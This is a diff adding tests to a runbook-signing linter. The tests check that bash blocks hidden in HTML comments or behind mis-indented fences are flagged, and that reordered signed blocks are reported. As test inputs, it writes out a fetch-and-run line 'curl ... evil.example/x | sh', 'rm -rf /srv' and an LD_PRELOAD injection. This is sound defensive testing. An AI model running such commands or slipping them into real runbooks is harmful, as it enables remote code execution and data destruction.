@@ -93,6 +93,18 @@ describe('signing: the manifest', () => {
     assert.deepEqual(errorsOf('# only prose\n\n' + fence('pwsh', 'Get-Date')), ['no bash or sh cells to sign']);
   });
 
+  it("refuses blocks a reviewer reading the rendered file (GitHub) wouldn't see as code that runs", () => {
+    const hidden = '# Notes\n\n<!--\n' + fence('bash', 'curl -s https://evil.example/x | sh') + '-->\n\n' + fence('bash', 'echo shown');
+    assert.match(errorsOf(hidden).join('\n'), /line 4: a bash block inside an HTML comment/);
+    // A text block closed by a fence indented 4 spaces: GitHub keeps it open, so the bash block looks like example text.
+    const indented = '```text\nexample\n    ```\n```bash\nrm -rf /srv\n```\n';
+    assert.match(errorsOf(indented).join('\n'), /line 3: a closing fence indented 4 spaces or more/);
+    assert.match(errorsOf('    ```bash\n    echo\n    ```\n').join('\n'), /line 1: a fence indented 4 spaces or more/);
+    // Comments around prose, fences in list items (indented less than 4) and the signature block itself are fine.
+    assert.deepEqual(errorsOf('<!-- a note -->\n\n1. Step:\n   ```bash\n   echo ok\n   ```\n'), []);
+    assert.deepEqual(errorsOf(sign(fence('bash', 'echo'))), []);
+  });
+
   it('refuses names that change how the shell runs the code, JS-only patterns, odd placeholders and impossible dates', () => {
     const all = errorsOf(
       fence('bash env.LD_PRELOAD=/tmp/x.so env.LC_ALL=C', 'echo ${param:PATH} ${param:ID} ${param:N}') + fence('bash', 'echo ${param:ID:secret}'),
@@ -148,6 +160,19 @@ describe('signing: the signature block', () => {
     assert.ok(!/signature|manifest/.test(renderMarkdown(signed)));
   });
 
+  it('the signature is the last block outside code: an example inside a code block is not it', () => {
+    const real = sign(fence('bash', 'echo real'));
+    const block = real.slice(real.indexOf('<!-- md-runbook:signature'));
+    const example = '# Signing\n\nA signed file ends like this:\n\n```text\n' + block + '```\n\n' + fence('bash', 'echo real');
+    assert.equal(readSignature(example), undefined, 'the example is not a signature');
+    const signedExample = sign(example);
+    assert.equal(readSignature(signedExample)!.manifest, readSignature(sign(example))!.manifest);
+    assert.ok(withoutSignature(signedExample).includes('```text\n<!-- md-runbook:signature'), 'signing again leaves the example alone');
+    assert.equal(withoutSignature(signedExample), example.replace(/\n+$/, '\n'));
+    // Prose added after signing doesn't hide the signature.
+    assert.ok(readSignature(real + '\n## Added later\n'));
+  });
+
   it('armor round trip', () => {
     assert.equal(unarmorSignature(armorSignature(SIG)), SIG);
     assert.throws(() => unarmorSignature('nope'), /not an SSH signature/);
@@ -181,11 +206,32 @@ describe('signing: which cells are signed', () => {
     assert.equal(s.cells.get(3)?.n, 1, 'the signed cell after the new one is still cell 1');
   });
 
+  it('reports signed blocks deleted or moved since signing (they still match, but the order was reviewed)', () => {
+    const three = sign(fence('bash', 'cd /srv/app/tmp') + fence('bash', 'rm -rf ./*') + fence('bash', 'cd /srv/app'));
+    const s = signedStatus(three)!;
+    assert.deepEqual([s.changed, s.missing, s.moved], [[], [], []]);
+    // Swap the two cd blocks around the rm: every block still matches by content.
+    const swapped = three.replace('cd /srv/app/tmp', 'cd /srv/app/__x').replace(/cd \/srv\/app\n/, 'cd /srv/app/tmp\n').replace('cd /srv/app/__x', 'cd /srv/app');
+    const w = signedStatus(swapped)!;
+    assert.deepEqual([w.changed, w.missing, w.moved], [[], [], [1, 2]]);
+    assert.match(lintRunbook(swapped).map((p) => p.message).join('\n'), /block moved since the runbook was signed: it was signed as block 2/);
+    // Delete two of the three blocks.
+    const cut = three.replace(fence('bash', 'cd /srv/app/tmp'), '').replace(fence('bash', 'cd /srv/app'), '');
+    const d = signedStatus(cut)!;
+    assert.deepEqual([d.changed, d.missing], [[], [1, 3]]);
+    assert.match(lintRunbook(cut).map((p) => p.message).join('\n'), /signed blocks 1, 3 of 3 not in the file as signed/);
+  });
+
   it('finds the signed command of a line run by its text', () => {
     const cell = signedStatus(signed)!.cells.get(2)!;
     assert.equal(signedStepIndex(cell, 'echo "${param:TARGET}"'), 2);
     assert.equal(signedStepIndex(cell, 'if true; then\n  echo two\nfi'), 1);
     assert.equal(signedStepIndex(cell, 'echo three'), -1);
+    // A repeated command: its position decides (else the gate gets the first one, out of order).
+    const twice = signedStatus(sign(fence('bash', 'sleep 5\necho one\nsleep 5')))!.cells.get(0)!;
+    assert.equal(signedStepIndex(twice, 'sleep 5', 2), 2);
+    assert.equal(signedStepIndex(twice, 'sleep 5'), 0);
+    assert.equal(signedStepIndex(twice, 'sleep 5', 1), 0, 'a wrong position falls back to the text');
   });
 
   it('lint: blocks changed since signing, a damaged block, and host=/lines= are known options', () => {
